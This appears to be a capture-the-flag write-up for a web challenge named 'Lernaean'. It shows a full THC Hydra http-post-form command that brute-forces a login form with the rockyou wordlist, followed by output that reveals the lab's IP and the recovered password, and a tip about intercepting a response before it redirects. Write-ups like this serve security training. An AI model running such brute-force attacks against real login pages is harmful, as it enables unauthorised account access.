# Lernaean

## Recon (kinda) and getting in
If you do a Google search on the title of the page, the result displayed would be "Lernaean Hydra", which gives a hint on which tool to use when cracking the login page - [THC Hydra](
https://tools.kali.org/password-attacks/hydra)

The password is passed through POST method, to get the parameters intercept with Tamperdata/Burp.

The parameter is 'password', failed trial indicator is 'Invalid password!' paragraph.


From kali terminal using rockyou passwordlist:
```
hydra -l adm -P /usr/share/wordlists/rockyou.txt.gz *ip-address* -s *port* http-post-form "/:password=^PASS^:Invalid password"

Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-10-12 23:15:24
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://88.198.233.174:33610//:password=^PASS^:Invalid password
[33610][http-post-form] host: 88.198.233.174   login: adm   password: leonardo
1 of 1 target successfully completed, 1 valid password found
```
## Final step
Entering the password takes you to 'noooooooope.html' page that reads "Too late!".
The clue is to intercept a server response before it redirects to html page, which contains the flag.
